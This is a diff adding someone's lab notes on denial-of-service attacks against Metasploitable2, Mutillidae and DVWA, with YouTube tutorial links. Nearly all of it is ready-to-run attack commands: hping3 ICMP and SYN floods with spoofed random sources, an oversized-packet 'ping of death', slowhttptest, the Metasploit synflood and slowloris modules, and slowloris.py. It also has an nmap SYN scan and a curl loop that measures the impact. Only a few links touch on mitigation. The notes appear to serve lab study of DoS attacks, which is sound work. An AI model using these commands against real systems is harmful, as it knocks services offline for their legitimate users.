@@ -1,0 +1,120 @@
+
+DoS attack : 
+https://www.youtube.com/watch?v=UVNeKPsKxIE
+-----------------------------------------
+
+Metasploitable 
+netstat -s | grep -i icmp
+
+ping -c <ip_address>
+
+Metasploitable 
+netstat -s | grep -i icmp
+
+
+hping3 --icmp --flood --rand-source <ip>
+
+Metasploitable 
+tcpdump icmp
+
+
+NMPA SYN SCAN
+nmap -sS -Pn <ip>
+
+Port 80 : 
+
+hping3 -S -p 80 --flood --rand-source <ip>
+
+
+metasploitable : 
+netstat -ant | grep -i SYN_RECV
+
+APPLICATION LAYER ATTACK
+url/mutillidae
+apt install slowhttptest
+
+slowhttptest -c 1000 -H -u <url/mutillidae>
+
+
+
+
+https://www.youtube.com/watch?v=ocVW6Py0lIM
+-------------------------------------------
+msfconsole
+
+search synflood
+
+show options
+
+set rhost <ip>
+
+run
+
+wireshark
+
+
+
+OR : 
+hping3 -S -p 80 --flood --rand-source <ip>
+
+
+Ping of death : 
+hping3 -d 65538 -p 80 --flood --rand-source <ip>
+
+
+https://www.youtube.com/watch?v=LpVusrUAOa4
+--------------------------------------------
+slowloris : 
+msfconsole
+
+use auxilliary/dos/http/slowloris
+set rhost <ip>
+set rport 80
+set socket 300 (150 - 300 is enough for metasploitable2)
+set delay 3
+run
+
+
+find wireshark
+
+test script
+Script to Test the DOS Impact on the Kali Terminal 
+
+for i in {1..10}; do
+  curl -m 2 -s -o /dev/null -w "attack code=%{http_code} time=%{time_total}s\n" \
+  http://192.168.56.105/; sleep 0.2
+done
+
+
+
+
+
+
+
+
+https://www.youtube.com/watch?v=KEJ41X5PoPw&pp=ygUPc2xvd29yaXMgYXR0YWNr
+-----------------------------------------------------------------------
+Rewrite : https://github.com/gkbrk/slowloris
+In server : 
+service apache2 start
+
+python3 slowloris.py <ip> -s 500
+
+
+
+https://www.youtube.com/watch?v=_m0sQFx5-2I
+------------------------------------------
+Mitigation
+slowloris metasploit for dvwa
+
+
+https://www.youtube.com/watch?v=B0UAaDea-rk
+-------------------------------------------
+metasploit synflood + top
+https://www.youtube.com/watch?v=Y0pz--KL1Xo
+
+
+Security apache : 
+https://www.youtube.com/watch?v=XoNbgqgP-dc
+https://www.youtube.com/watch?v=MB7nQrlP5Yc
+
